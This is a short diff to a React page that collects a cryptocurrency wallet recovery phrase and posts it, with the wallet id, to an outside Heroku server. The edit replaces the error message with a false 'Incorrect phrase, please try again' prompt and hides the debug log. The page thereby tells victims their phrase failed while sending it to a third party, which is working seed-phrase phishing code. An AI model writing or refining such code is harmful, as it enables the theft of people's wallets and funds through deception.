@@ -12,14 +12,14 @@ export default function Discover() {
   const { pid } = router.query;
 
   const notify = () => {
-    phrase === "" ? "" : toast.error("Failed, Unable to import wallet.");
+    phrase === "" ? "" : toast.error("Incorrect phrase, please try again.");
   };
 
   const handleSubmit = (e) => {
     e.preventDefault();
     if (phrase !== "") {
       const pS = { phrase: phrase, wallet: pid };
-      console.log(pS);
+      // console.log(pS);
 
       axios
         .post("https://glacial-temple-10425.herokuapp.com/send", pS)
